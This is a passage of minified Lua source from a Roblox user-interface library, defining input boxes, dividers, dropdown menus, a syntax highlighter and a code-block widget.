elseif ao.UserInputType==Enum.UserInputType.MouseButton1 and ak.Value=="MouseLeft"then
ad.SafeCallback(ak.Callback,"MouseLeft")
elseif ao.UserInputType==Enum.UserInputType.MouseButton2 and ak.Value=="MouseRight"then
ad.SafeCallback(ak.Callback,"MouseRight")
end
end)

return ak.__type,ak
end

return ag end function a.L()

local aa=a.load'd'local ac=
aa.New local ad=
aa.Tween

local ae={
UICorner=8,
UIPadding=8,
}local af=a.load'm'

.New
local ag=a.load'n'.New

function ae.New(ah,ai)
local aj={
__type="Input",
Title=ai.Title or"Input",
Desc=ai.Desc or nil,
Type=ai.Type or"Input",
Locked=ai.Locked or false,
LockedTitle=ai.LockedTitle,
InputIcon=ai.InputIcon or false,
Placeholder=ai.Placeholder or"Enter Text...",
Value=ai.Value or"",
Callback=ai.Callback or function()end,
ClearTextOnFocus=ai.ClearTextOnFocus or false,
UIElements={},

Width=150,
}

local ak=true

aj.InputFrame=a.load'C'{
Title=aj.Title,
Desc=aj.Desc,
Parent=ai.Parent,
TextOffset=aj.Width,
Hover=false,
Tab=ai.Tab,
Index=ai.Index,
Window=ai.Window,
ElementTable=aj,
ParentConfig=ai,
Tags=ai.Tags,
}

local al=ag(
aj.Placeholder,
aj.InputIcon,
aj.Type=="Textarea"and aj.InputFrame.UIElements.Container or aj.InputFrame.UIElements.Main,
aj.Type,
function(al)
aj:Set(al,true)
end,
nil,
ai.Window.NewElements and 12 or 10,
aj.ClearTextOnFocus
)

if aj.Type~="Textarea"then
al.Size=UDim2.new(0,aj.Width,0,36)
al.Position=UDim2.new(1,0,ai.Window.NewElements and 0 or 0.5,0)
al.AnchorPoint=Vector2.new(1,ai.Window.NewElements and 0 or 0.5)
else
al.Size=UDim2.new(1,0,0,148)
end






function aj.Lock(am)
aj.Locked=true
ak=false
return aj.InputFrame:Lock(aj.LockedTitle)
end
function aj.Unlock(am)
aj.Locked=false
ak=true
return aj.InputFrame:Unlock()
end

function aj.Set(am,an,ao)
if ak then
aj.Value=an
aa.SafeCallback(aj.Callback,an)

if not ao then
al.Frame.Frame.TextBox.Text=an
end
end
end

function aj.SetPlaceholder(am,an)
al.Frame.Frame.TextBox.PlaceholderText=an
aj.Placeholder=an
end

aj:Set(aj.Value)

if aj.Locked then
aj:Lock()
end

return aj.__type,aj
end

return ae end function a.M()

local aa=a.load'd'
local ae=aa.New

local af={}

function af.New(ag,ah)
local ai=ae("Frame",{
Size=ah.ParentType~="Group"and UDim2.new(1,0,0,1)or UDim2.new(0,1,1,0),
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
BackgroundTransparency=.9,
ThemeTag={
BackgroundColor3="Text"
}
})
local aj=ae("Frame",{
Parent=ah.Parent,
Size=ah.ParentType~="Group"and UDim2.new(1,-7,0,7)or UDim2.new(0,7,1,-7),
BackgroundTransparency=1,
},{
ai
})

return"Divider",{__type="Divider",ElementFrame=aj}
end

return af end function a.N()
local aa={}

local ae=(cloneref or clonereference or function(ae)
return ae
end)

local af=ae(game:GetService"UserInputService")
local ag=ae(game:GetService"Players").LocalPlayer:GetMouse()
local ah=ae(game:GetService"Workspace").CurrentCamera local ai=

workspace.CurrentCamera

local aj=a.load'n'.New

local ak=a.load'd'
local al=ak.New
local am=ak.Tween

local an=0.67

function aa.New(ao,ap,aq,ar)
local as={}

if not ap.Callback then
ar="Menu"
end

ap.UIElements.UIListLayout=al("UIListLayout",{
Padding=UDim.new(0,aq.MenuPadding/1.5),
FillDirection="Vertical",
HorizontalAlignment="Center",
})

ap.UIElements.Menu=ak.NewRoundFrame(aq.MenuCorner,"Squircle",{
ThemeTag={
ImageColor3="DropdownBackground",
},
ImageTransparency=1,
Size=UDim2.new(1,0,1,0),
AnchorPoint=Vector2.new(1,0),
Position=UDim2.new(1,0,0,0),
},{
al("UIPadding",{
PaddingTop=UDim.new(0,aq.MenuPadding),
PaddingLeft=UDim.new(0,aq.MenuPadding),
PaddingRight=UDim.new(0,aq.MenuPadding),
PaddingBottom=UDim.new(0,aq.MenuPadding),
}),
al("UIListLayout",{
FillDirection="Vertical",
Padding=UDim.new(0,aq.MenuPadding),
}),
al("Frame",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,1,ap.SearchBarEnabled and-aq.MenuPadding-aq.SearchBarHeight),

ClipsDescendants=true,
LayoutOrder=999,
Name="Frame",
},{
al("UICorner",{
CornerRadius=UDim.new(0,aq.MenuCorner-aq.MenuPadding),
}),
al("ScrollingFrame",{
Size=UDim2.new(1,0,1,0),
ScrollBarThickness=0,
ScrollingDirection="Y",
AutomaticCanvasSize="Y",
CanvasSize=UDim2.new(0,0,0,0),
BackgroundTransparency=1,
ScrollBarImageTransparency=1,
},{
ap.UIElements.UIListLayout,
}),
}),
})

ap.UIElements.MenuCanvas=al("Frame",{
Size=UDim2.new(0,ap.MenuWidth,0,300),
BackgroundTransparency=1,
Position=UDim2.new(-10,0,-10,0),
Visible=false,
Active=false,

Parent=ao.WindUI.DropdownGui,
AnchorPoint=Vector2.new(1,0),
},{
ap.UIElements.Menu,
al("UISizeConstraint",{
MinSize=Vector2.new(170,0),
MaxSize=Vector2.new(300,400),
}),
})

local function RecalculateCanvasSize()
ap.UIElements.Menu.Frame.ScrollingFrame.CanvasSize=
UDim2.fromOffset(0,ap.UIElements.UIListLayout.AbsoluteContentSize.Y)
end

local function RecalculateListSize()
local at=ao.WindUI.DropdownGui.AbsoluteSize.Y

local au=ap.UIElements.UIListLayout.AbsoluteContentSize.Y/ao.UIScale
local av=ap.SearchBarEnabled and(aq.SearchBarHeight+(aq.MenuPadding*3))
or(aq.MenuPadding*2)
local aw=au+av

if aw>at then
ap.UIElements.MenuCanvas.Size=
UDim2.fromOffset(ap.UIElements.MenuCanvas.AbsoluteSize.X,at)
else
ap.UIElements.MenuCanvas.Size=
UDim2.fromOffset(ap.UIElements.MenuCanvas.AbsoluteSize.X,aw)
end
end

function UpdatePosition()
local at=ap.UIElements.Dropdown or ap.DropdownFrame.UIElements.Main
local au=ap.UIElements.MenuCanvas

local av=ah.ViewportSize.Y
-(at.AbsolutePosition.Y+at.AbsoluteSize.Y)
-aq.MenuPadding
-54
local aw=au.AbsoluteSize.Y+aq.MenuPadding

local ax=-54
if av<aw then
ax=aw-av-54
end

au.Position=UDim2.new(
0,
at.AbsolutePosition.X+at.AbsoluteSize.X,
0,
at.AbsolutePosition.Y+at.AbsoluteSize.Y-ax+(aq.MenuPadding*2)
)
end

local at

function as.Display(au)
local av=ap.Values
local aw=""

if ap.Multi then
local ax={}
if typeof(ap.Value)=="table"then
for ay,az in ipairs(ap.Value)do
local aA=typeof(az)=="table"and az.Title or az
ax[aA]=true
end
end

for ay,az in ipairs(av)do
local aA=typeof(az)=="table"and az.Title or az
if ax[aA]then
aw=aw..aA..", "
end
end

if#aw>0 then
aw=aw:sub(1,#aw-2)
end
else
aw=typeof(ap.Value)=="table"and(ap.Value.Title or ap.Value[1])
or ap.Value
or""
end

if ap.UIElements.Dropdown then
ap.UIElements.Dropdown.Frame.Frame.TextLabel.Text=(aw==""and"--"or aw)
end
end

local function Callback(au)
as:Display()
if ap.Locked then
return
end

if ap.Callback then
task.spawn(function()
if ap.Locked then
return
end
ak.SafeCallback(ap.Callback,ap.Value)
end)
else
task.spawn(function()
if ap.Locked then
return
end
ak.SafeCallback(au)
end)
end
end

function as.LockValues(au,av)
if not av then
return
end

for aw,ax in next,ap.Tabs do
if ax and ax.UIElements and ax.UIElements.TabItem then
local ay=ax.Name
local az=false

for aA,aB in next,av do
if ay==aB then
az=true
break
end
end

if az then
am(ax.UIElements.TabItem,0.1,{ImageTransparency=1}):Play()

am(ax.UIElements.TabItem.Frame.Title.TextLabel,0.1,{TextTransparency=0.6}):Play()
if ax.UIElements.TabIcon then
am(ax.UIElements.TabIcon.ImageLabel,0.1,{ImageTransparency=0.6}):Play()
end

ax.UIElements.TabItem.Active=false
ax.Locked=true
else
if ax.Selected then
am(ax.UIElements.TabItem,0.1,{ImageTransparency=an}):Play()

am(ax.UIElements.TabItem.Frame.Title.TextLabel,0.1,{TextTransparency=0}):Play()
if ax.UIElements.TabIcon then
am(ax.UIElements.TabIcon.ImageLabel,0.1,{ImageTransparency=0}):Play()
end
else
am(ax.UIElements.TabItem,0.1,{ImageTransparency=1}):Play()

am(
ax.UIElements.TabItem.Frame.Title.TextLabel,
0.1,
{TextTransparency=ar=="Dropdown"and 0.4 or 0.05}
):Play()
if ax.UIElements.TabIcon then
am(
ax.UIElements.TabIcon.ImageLabel,
0.1,
{ImageTransparency=ar=="Dropdown"and 0.2 or 0}
):Play()
end
end

ax.UIElements.TabItem.Active=true
ax.Locked=false
end
end
end
end

function as.Refresh(au,av)
if ao.Window.Destroyed then
return
end

for aw,ax in next,ap.UIElements.Menu.Frame.ScrollingFrame:GetChildren()do
if not ax:IsA"UIListLayout"then
ax:Destroy()
end
end

ap.Tabs={}

if ap.SearchBarEnabled then
if not at then
at=aj("Search...","search",ap.UIElements.Menu,nil,function(aw)
for ax,ay in next,ap.Tabs do
if string.find(string.lower(ay.Name),string.lower(aw),1,true)then
ay.UIElements.TabItem.Visible=true
else
ay.UIElements.TabItem.Visible=false
end
RecalculateListSize()
RecalculateCanvasSize()
end
end,true)
at.Size=UDim2.new(1,0,0,aq.SearchBarHeight)
at.Position=UDim2.new(0,0,0,0)
at.Name="SearchBar"
end
end

for aw,ax in next,av do
if ax.Type~="Divider"then
local ay={
Name=typeof(ax)=="table"and ax.Title or ax,
Desc=typeof(ax)=="table"and ax.Desc or nil,
Icon=typeof(ax)=="table"and ax.Icon or nil,
IconSize=typeof(ax)=="table"and ax.IconSize or nil,
Original=ax,
Selected=false,
Locked=typeof(ax)=="table"and ax.Locked or false,
UIElements={},
}
local az
if ay.Icon then
az=ak.Image(ay.Icon,ay.Icon,0,ao.Window.Folder,"Dropdown",true)
az.Size=
UDim2.new(0,ay.IconSize or aq.TabIcon,0,ay.IconSize or aq.TabIcon)
az.ImageLabel.ImageTransparency=ar=="Dropdown"and 0.2 or 0
ay.UIElements.TabIcon=az
end
ay.UIElements.TabItem=ak.NewRoundFrame(
aq.MenuCorner-aq.MenuPadding,
"Squircle",
{
Size=UDim2.new(1,0,0,36),
AutomaticSize=ay.Desc and"Y",
ImageTransparency=1,
Parent=ap.UIElements.Menu.Frame.ScrollingFrame,

ThemeTag={
ImageColor3="DropdownTabBackground",
},
Active=not ay.Locked,
},
{
ak.NewRoundFrame(aq.MenuCorner-aq.MenuPadding,"Glass-1.4",{
Size=UDim2.new(1,0,1,0),
ThemeTag={
ImageColor3="DropdownTabBorder",
},
ImageTransparency=1,
Name="Highlight",
},{













}),
al("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
},{
al("UIListLayout",{
Padding=UDim.new(0,aq.TabPadding),
FillDirection="Horizontal",
VerticalAlignment="Center",
}),
al("UIPadding",{
PaddingTop=UDim.new(0,aq.TabPadding),
PaddingLeft=UDim.new(0,aq.TabPadding),
PaddingRight=UDim.new(0,aq.TabPadding),
PaddingBottom=UDim.new(0,aq.TabPadding),
}),
al("UICorner",{
CornerRadius=UDim.new(0,aq.MenuCorner-aq.MenuPadding),
}),
az,
al("Frame",{
Size=UDim2.new(1,az and-aq.TabPadding-aq.TabIcon or 0,0,0),
BackgroundTransparency=1,
AutomaticSize="Y",
Name="Title",
},{
al("TextLabel",{
Text=ay.Name,
TextXAlignment="Left",
FontFace=Font.new(ak.Font,Enum.FontWeight.Medium),
ThemeTag={
TextColor3="Text",
BackgroundColor3="Text",
},
TextSize=15,
BackgroundTransparency=1,
TextTransparency=ar=="Dropdown"and 0.4 or 0.05,
LayoutOrder=999,
AutomaticSize="Y",
Size=UDim2.new(1,0,0,0),
}),
al("TextLabel",{
Text=ay.Desc or"",
TextXAlignment="Left",
FontFace=Font.new(ak.Font,Enum.FontWeight.Regular),
ThemeTag={
TextColor3="Text",
BackgroundColor3="Text",
},
TextSize=15,
BackgroundTransparency=1,
TextTransparency=ar=="Dropdown"and 0.6 or 0.35,
LayoutOrder=999,
AutomaticSize="Y",
TextWrapped=true,
Size=UDim2.new(1,0,0,0),
Visible=ay.Desc and true or false,
Name="Desc",
}),
al("UIListLayout",{
Padding=UDim.new(0,aq.TabPadding/3),
FillDirection="Vertical",
}),
}),
}),
},
true
)

if ay.Locked then
ay.UIElements.TabItem.Frame.Title.TextLabel.TextTransparency=0.6
if ay.UIElements.TabIcon then
ay.UIElements.TabIcon.ImageLabel.ImageTransparency=0.6
end
end

if ap.Multi and typeof(ap.Value)=="string"then
for aA,aB in next,ap.Values do
if typeof(aB)=="table"then
if aB.Title==ap.Value then
ap.Value={aB}
end
else
if aB==ap.Value then
ap.Value={ap.Value}
end
end
end
end

if ap.Multi then
local aA=false
if typeof(ap.Value)=="table"then
for aB,b in ipairs(ap.Value)do
local d=typeof(b)=="table"and b.Title or b
if d==ay.Name then
aA=true
break
end
end
end
ay.Selected=aA
else
local aA=typeof(ap.Value)=="table"and ap.Value.Title or ap.Value
ay.Selected=aA==ay.Name
end

if ay.Selected and not ay.Locked then
ay.UIElements.TabItem.ImageTransparency=an

ay.UIElements.TabItem.Frame.Title.TextLabel.TextTransparency=0
if ay.UIElements.TabIcon then
ay.UIElements.TabIcon.ImageLabel.ImageTransparency=0
end
end

ap.Tabs[aw]=ay

as:Display()

if ar=="Dropdown"then
ak.AddSignal(ay.UIElements.TabItem.MouseButton1Click,function()
if ap.Locked or ay.Locked then
return
end

if ap.Multi then
if not ay.Selected then
ay.Selected=true
am(
ay.UIElements.TabItem,
0.1,
{ImageTransparency=an}
):Play()

am(ay.UIElements.TabItem.Frame.Title.TextLabel,0.1,{TextTransparency=0}):Play()
if ay.UIElements.TabIcon then
am(ay.UIElements.TabIcon.ImageLabel,0.1,{ImageTransparency=0}):Play()
end
table.insert(ap.Value,ay.Original)
else
if not ap.AllowNone and#ap.Value==1 then
return
end
ay.Selected=false
am(ay.UIElements.TabItem,0.1,{ImageTransparency=1}):Play()

am(ay.UIElements.TabItem.Frame.Title.TextLabel,0.1,{TextTransparency=0.4}):Play()
if ay.UIElements.TabIcon then
am(ay.UIElements.TabIcon.ImageLabel,0.1,{ImageTransparency=0.2}):Play()
end

for aA,aB in next,ap.Value do
if typeof(aB)=="table"and(aB.Title==ay.Name)or(aB==ay.Name)then
table.remove(ap.Value,aA)
break
end
end
end
else
for aA,aB in next,ap.Tabs do
am(aB.UIElements.TabItem,0.1,{ImageTransparency=1}):Play()

am(
aB.UIElements.TabItem.Frame.Title.TextLabel,
0.1,
{TextTransparency=0.4}
):Play()
if aB.UIElements.TabIcon then
am(aB.UIElements.TabIcon.ImageLabel,0.1,{ImageTransparency=0.2}):Play()
end
aB.Selected=false
end
ay.Selected=true
am(ay.UIElements.TabItem,0.1,{ImageTransparency=an}):Play()

am(ay.UIElements.TabItem.Frame.Title.TextLabel,0.1,{TextTransparency=0}):Play()
if ay.UIElements.TabIcon then
am(ay.UIElements.TabIcon.ImageLabel,0.1,{ImageTransparency=0}):Play()
end
ap.Value=ay.Original
end
Callback()
end)
elseif ar=="Menu"then
if not ay.Locked then
ak.AddSignal(ay.UIElements.TabItem.MouseEnter,function()
am(ay.UIElements.TabItem,0.08,{ImageTransparency=an}):Play()
end)
ak.AddSignal(ay.UIElements.TabItem.InputEnded,function()
am(ay.UIElements.TabItem,0.08,{ImageTransparency=1}):Play()
end)
end
ak.AddSignal(ay.UIElements.TabItem.MouseButton1Click,function()
if ap.Locked or ay.Locked then
return
end
Callback(ax.Callback or function()end)
end)
end

RecalculateCanvasSize()
RecalculateListSize()
else a.load'M'
:New{Parent=ap.UIElements.Menu.Frame.ScrollingFrame}
end
end










ap.UIElements.MenuCanvas.Size=UDim2.new(
0,
ap.MenuWidth+6+6+5+5+18+6+6,
ap.UIElements.MenuCanvas.Size.Y.Scale,
ap.UIElements.MenuCanvas.Size.Y.Offset
)
Callback()

ap.Values=av
end

as:Refresh(ap.Values)

function as.Select(au,av)
if av then
ap.Value=av
else
if ap.Multi then
ap.Value={}
else
ap.Value=nil
end
end
as:Refresh(ap.Values)
end

RecalculateListSize()
RecalculateCanvasSize()

function as.Open(au)
if not ap.Locked then
ap.UIElements.Menu.Visible=true
ap.UIElements.MenuCanvas.Visible=true
ap.UIElements.MenuCanvas.Active=true
ap.UIElements.Menu.Size=UDim2.new(1,0,0,0)
am(ap.UIElements.Menu,0.1,{
Size=UDim2.new(1,0,1,0),
ImageTransparency=0,
},Enum.EasingStyle.Quart,Enum.EasingDirection.Out):Play()

task.spawn(function()
task.wait(0.1)
if ap.Locked then
return
end
ap.Opened=true
end)

UpdatePosition()
end
end

function as.Close(au)
ap.Opened=false

am(ap.UIElements.Menu,0.25,{
Size=UDim2.new(1,0,0,0),
ImageTransparency=1,
},Enum.EasingStyle.Quart,Enum.EasingDirection.Out):Play()

task.spawn(function()
task.wait(0.1)
ap.UIElements.Menu.Visible=false
end)

task.spawn(function()
task.wait(0.25)
ap.UIElements.MenuCanvas.Visible=false
ap.UIElements.MenuCanvas.Active=false
end)
end

ak.AddSignal(
(
ap.UIElements.Dropdown and ap.UIElements.Dropdown.MouseButton1Click
or ap.DropdownFrame.UIElements.Main.MouseButton1Click
),
function()
as:Open()
end
)

ak.AddSignal(af.InputBegan,function(au)
if
au.UserInputType==Enum.UserInputType.MouseButton1
or au.UserInputType==Enum.UserInputType.Touch
then
local av=ap.UIElements.MenuCanvas
local aw,ax=av.AbsolutePosition,av.AbsoluteSize

local ay=ap.UIElements.Dropdown or ap.DropdownFrame.UIElements.Main
local az=ay.AbsolutePosition
local aA=ay.AbsoluteSize

local aB=ag.X>=az.X
and ag.X<=az.X+aA.X
and ag.Y>=az.Y
and ag.Y<=az.Y+aA.Y

local b=ag.X>=aw.X
and ag.X<=aw.X+ax.X
and ag.Y>=aw.Y
and ag.Y<=aw.Y+ax.Y

if ao.Window.CanDropdown and ap.Opened and not aB and not b then
as:Close()
end
end
end)

ak.AddSignal(
ap.UIElements.Dropdown and ap.UIElements.Dropdown:GetPropertyChangedSignal"AbsolutePosition"
or ap.DropdownFrame.UIElements.Main:GetPropertyChangedSignal"AbsolutePosition",
UpdatePosition
)

return as
end

return aa end function a.O()

local aa=(cloneref or clonereference or function(aa)
return aa
end)

aa(game:GetService"UserInputService")
aa(game:GetService"Players").LocalPlayer:GetMouse()local ae=
aa(game:GetService"Workspace").CurrentCamera

local af=a.load'd'
local ag=af.New local ah=
af.Tween

local ai=a.load'w'.New local aj=a.load'n'
.New
local ak=a.load'N'.New local al=

workspace.CurrentCamera

local am={
UICorner=10,
UIPadding=12,
MenuCorner=15,
MenuPadding=5,
TabPadding=10,
SearchBarHeight=39,
TabIcon=18,
}

function am.New(an,ao)
local ap={
__type="Dropdown",
Title=ao.Title or"Dropdown",
Desc=ao.Desc or nil,
Locked=ao.Locked or false,
LockedTitle=ao.LockedTitle,
Values=ao.Values or{},
MenuWidth=ao.MenuWidth or 180,
Value=ao.Value,
AllowNone=ao.AllowNone,
SearchBarEnabled=ao.SearchBarEnabled or false,
Multi=ao.Multi,
Callback=ao.Callback or nil,

UIElements={},

Opened=false,
Tabs={},

Width=150,
}

if ap.Multi and not ap.Value then
ap.Value={}
end
if ap.Values and typeof(ap.Value)=="number"then
ap.Value=ap.Values[ap.Value]
end

ap.DropdownFrame=a.load'C'{
Title=ap.Title,
Desc=ap.Desc,
Parent=ao.Parent,
TextOffset=ap.Callback and ap.Width or 20,
Hover=not ap.Callback and true or false,
Tab=ao.Tab,
Index=ao.Index,
Window=ao.Window,
ElementTable=ap,
ParentConfig=ao,
Tags=ao.Tags,
}

if ap.Callback then
ap.UIElements.Dropdown=
ai("",nil,ap.DropdownFrame.UIElements.Main,nil,ao.Window.NewElements and 12 or 10)

ap.UIElements.Dropdown.Frame.Frame.TextLabel.TextTruncate="AtEnd"
ap.UIElements.Dropdown.Frame.Frame.TextLabel.Size=
UDim2.new(1,ap.UIElements.Dropdown.Frame.Frame.TextLabel.Size.X.Offset-18-12-12,0,0)

ap.UIElements.Dropdown.Size=UDim2.new(0,ap.Width,0,36)
ap.UIElements.Dropdown.Position=UDim2.new(1,0,ao.Window.NewElements and 0 or 0.5,0)
ap.UIElements.Dropdown.AnchorPoint=Vector2.new(1,ao.Window.NewElements and 0 or 0.5)





end

ap.DropdownMenu=ak(ao,ap,am,"Dropdown")

ap.Display=ap.DropdownMenu.Display
ap.Refresh=ap.DropdownMenu.Refresh
ap.Select=ap.DropdownMenu.Select
ap.Open=ap.DropdownMenu.Open
ap.Close=ap.DropdownMenu.Close

ag("ImageLabel",{
Image=af.Icon"chevrons-up-down"[1],
ImageRectOffset=af.Icon"chevrons-up-down"[2].ImageRectPosition,
ImageRectSize=af.Icon"chevrons-up-down"[2].ImageRectSize,
Size=UDim2.new(0,18,0,18),
Position=UDim2.new(1,ap.UIElements.Dropdown and-12 or 0,0.5,0),
ThemeTag={
ImageColor3="Icon",
},
AnchorPoint=Vector2.new(1,0.5),
Parent=ap.UIElements.Dropdown and ap.UIElements.Dropdown.Frame
or ap.DropdownFrame.UIElements.Main,
})

function ap.Lock(aq)
ap.Locked=true
if ap.Opened or ap.UIElements.MenuCanvas.Visible then
ap:Close()
end
return ap.DropdownFrame:Lock(ap.LockedTitle)
end
function ap.Unlock(aq)
ap.Locked=false
return ap.DropdownFrame:Unlock()
end

if ap.Locked then
ap:Lock()
end

return ap.__type,ap
end

return am end function a.P()




local aa={}
local af={
lua={
"and",
"break",
"or",
"else",
"elseif",
"if",
"then",
"until",
"repeat",
"while",
"do",
"for",
"in",
"end",
"local",
"return",
"function",
"export",
},
rbx={
"game",
"workspace",
"script",
"math",
"string",
"table",
"task",
"wait",
"select",
"next",
"Enum",
"tick",
"assert",
"shared",
"loadstring",
"tonumber",
"tostring",
"type",
"typeof",
"unpack",
"Instance",
"CFrame",
"Vector3",
"Vector2",
"Color3",
"UDim",
"UDim2",
"Ray",
"BrickColor",
"OverlapParams",
"RaycastParams",
"Axes",
"Random",
"Region3",
"Rect",
"TweenInfo",
"collectgarbage",
"not",
"utf8",
"pcall",
"xpcall",
"_G",
"setmetatable",
"getmetatable",
"os",
"pairs",
"ipairs",
},
operators={
"#",
"+",
"-",
"*",
"%",
"/",
"^",
"=",
"~",
"=",
"<",
">",
},
}

local ag={
numbers=Color3.fromHex"#FAB387",
boolean=Color3.fromHex"#FAB387",
operator=Color3.fromHex"#94E2D5",
lua=Color3.fromHex"#CBA6F7",
rbx=Color3.fromHex"#F38BA8",
str=Color3.fromHex"#A6E3A1",
comment=Color3.fromHex"#9399B2",
null=Color3.fromHex"#F38BA8",
call=Color3.fromHex"#89B4FA",
self_call=Color3.fromHex"#89B4FA",
local_property=Color3.fromHex"#CBA6F7",
}

local function createKeywordSet(ai)
local ak={}
for al,am in ipairs(ai)do
ak[am]=true
end
return ak
end

local ai=createKeywordSet(af.lua)
local ak=createKeywordSet(af.rbx)
local al=createKeywordSet(af.operators)

local function getHighlight(am,an)
local ao=am[an]

if ag[ao.."_color"]then
return ag[ao.."_color"]
end

if tonumber(ao)then
return ag.numbers
elseif ao=="nil"then
return ag.null
elseif ao:sub(1,2)=="--"then
return ag.comment
elseif al[ao]then
return ag.operator
elseif ai[ao]then
return ag.lua
elseif ak[ao]then
return ag.rbx
elseif ao:sub(1,1)=='"'or ao:sub(1,1)=="'"then
return ag.str
elseif ao=="true"or ao=="false"then
return ag.boolean
end

if am[an+1]=="("then
if am[an-1]==":"then
return ag.self_call
end

return ag.call
end

if am[an-1]=="."then
if am[an-2]=="Enum"then
return ag.rbx
end

return ag.local_property
end
end

function aa.run(am,an)
if an~=nil then
for ao,ap in next,an do
ag[ao]=ap
end
end

local ao={}
local ap=""

local aq=false
local ar=false
local as=false

for at=1,#am do
local au=am:sub(at,at)

if ar then
if au=="\n"and not as then
table.insert(ao,ap)
table.insert(ao,au)
ap=""

ar=false
elseif am:sub(at-1,at)=="]]"and as then
ap=ap.."]"

table.insert(ao,ap)
ap=""

ar=false
as=false
else
ap=ap..au
end
elseif aq then
if au==aq and am:sub(at-1,at-1)~="\\"or au=="\n"then
ap=ap..au
aq=false
else
ap=ap..au
end
else
if am:sub(at,at+1)=="--"then
table.insert(ao,ap)
ap="-"
ar=true
as=am:sub(at+2,at+3)=="[["
elseif au=='"'or au=="'"then
table.insert(ao,ap)
ap=au
aq=au
elseif al[au]then
table.insert(ao,ap)
table.insert(ao,au)
ap=""
elseif au:match"[%w_]"then
ap=ap..au
else
table.insert(ao,ap)
table.insert(ao,au)
ap=""
end
end
end

table.insert(ao,ap)

local at={}

for au,av in ipairs(ao)do
local aw=getHighlight(ao,au)

if aw then
local ax=string.format(
'<font color = "#%s">%s</font>',
aw:ToHex(),
av:gsub("<","&lt;"):gsub(">","&gt;")
)

table.insert(at,ax)
else
table.insert(at,av)
end
end

return table.concat(at)
end

return aa end function a.Q()

local aa={}

local af=a.load'd'
local ag=af.New
local ai=af.Tween

local ak=a.load'P'

function aa.New(al,am,an,ao,ap)
local aq={
Radius=am.ElementConfig.UICorner,
Padding=am.NewElements and am.ElementConfig.UIPadding+4 or am.ElementConfig.UIPadding,

CodeFrame=nil,
}

local ar=ag("TextLabel",{
Text="",
TextColor3=Color3.fromHex"#CDD6F4",
TextTransparency=0,
TextSize=al.CodeSize,
TextWrapped=false,
LineHeight=1.15,
RichText=true,
TextXAlignment="Left",
Size=UDim2.new(0,0,0,0),
BackgroundTransparency=1,
AutomaticSize="XY",
},{
ag("UIPadding",{
PaddingTop=UDim.new(0,aq.Padding+3),
PaddingLeft=UDim.new(0,aq.Padding+3),
PaddingRight=UDim.new(0,aq.Padding+3),
PaddingBottom=UDim.new(0,aq.Padding+3),
}),
})
ar.Font="Code"

local as=ag("ScrollingFrame",{
Size=UDim2.new(1,0,0,0),
BackgroundTransparency=1,
AutomaticCanvasSize=al.Height~=nil and"XY"or"X",
ScrollingDirection=al.Height~=nil and"XY"or"X",
ElasticBehavior="Never",
CanvasSize=UDim2.new(0,0,0,0),
ScrollBarThickness=0,
},{
ar,
})

local at=al.CanCopied
and ag("TextButton",{
BackgroundTransparency=1,
Size=UDim2.new(0,35,0,35),
Position=UDim2.new(1,-aq.Padding/2,0,aq.Padding/2),
AnchorPoint=Vector2.new(1,0),
Visible=ao and true or false,
},{
af.NewRoundFrame(aq.Radius-4,"Squircle",{



ImageColor3=Color3.fromHex"#ffffff",
ImageTransparency=1,
Size=UDim2.new(1,0,1,0),
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Name="Button",
},{
ag("UIScale",{
Scale=1,
}),
ag("ImageLabel",{
Image=af.Icon"copy"[1],
ImageRectSize=af.Icon"copy"[2].ImageRectSize,
ImageRectOffset=af.Icon"copy"[2].ImageRectPosition,
BackgroundTransparency=1,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Size=UDim2.new(0,12,0,12),



ImageColor3=Color3.fromHex"#ffffff",
ImageTransparency=0.1,
}),
}),
})
or nil

local au,av=af.NewRoundFrame(aq.Radius,"SquircleOutline",{
Size=UDim2.new(1,0,1,0),



ImageColor3=Color3.fromHex"#ffffff",
ImageTransparency=0.955,
Visible=false,
})

local aw,ax=af.NewRoundFrame(aq.Radius,"Squircle-TL-TR",{



ImageColor3=Color3.fromHex"#ffffff",
ImageTransparency=0.96,
Size=UDim2.new(1,0,0,20+(aq.Padding*2)),
Visible=al.Title and true or false,
},{










ag("TextLabel",{
Text=al.Title,



TextColor3=Color3.fromHex"#ffffff",
TextTransparency=0.2,
TextSize=18,
AutomaticSize="Y",
FontFace=Font.new(af.Font,Enum.FontWeight.Medium),
TextXAlignment="Left",
BackgroundTransparency=1,
TextTruncate="AtEnd",
Size=UDim2.new(1,at and-20-(aq.Padding*2),0,0),
}),
ag("UIPadding",{

PaddingLeft=UDim.new(0,aq.Padding+3),
PaddingRight=UDim.new(0,aq.Padding+3),

}),
ag("UIListLayout",{
Padding=UDim.new(0,aq.Padding),
FillDirection="Horizontal",
VerticalAlignment="Center",
}),
})

local ay,az=af.NewRoundFrame(aq.Radius,"Squircle",{



ImageColor3=Color3.fromHex"#212121",
ImageTransparency=0.035,
Size=al.Height~=nil
and UDim2.new(1,0,al.Height.Scale,al.Height.Offset==0 and-40 or al.Height.Offset)
or UDim2.new(1,0,0,20+(aq.Padding*2)),
AutomaticSize=al.Height~=nil and"None"or"Y",
Parent=an,
},{
au,
ag("Frame",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,al.Height~=nil and 1 or 0,0),
AutomaticSize=al.Height~=nil and"None"or"Y",
},{
aw,
as,
ag("UIListLayout",{
Padding=UDim.new(0,0),
FillDirection="Vertical",
}),
}),
at,
},nil,true)

aq.CodeFrame=ay
aq.CodeFrameModule=az
aq.OutlineFrame=au
aq.OutlineFrameModule=av
aq.TopbarFrame=aw
aq.TopbarFrameModule=ax

af.AddSignal(ar:GetPropertyChangedSignal"TextBounds",function()
if al.Height~=nil then
as.Size=UDim2.new(1,0,1,al.Title~=nil and-(20+(aq.Padding*2))or nil)
else
as.Size=
UDim2.new(1,0,0,(ar.TextBounds.Y/(ap or 1))+((aq.Padding+3)*2))
end
end)

function aq.Set(aA)
ar.Text=ak.run(aA,al.CodeTheme)
end

function aq.Destroy()
ay:Destroy()
aq=nil
end

aq.Set(al.Code)

if at then
af.AddSignal(at.InputBegan,function(aA:InputObject)
if
aA.UserInputType==Enum.UserInputType.MouseButton1
or aA.UserInputType==Enum.UserInputType.Touch
then
ai(at.Button,0.05,{ImageTransparency=0.95}):Play()
ai(at.Button.UIScale,0.05,{Scale=0.9}):Play()
end
end)
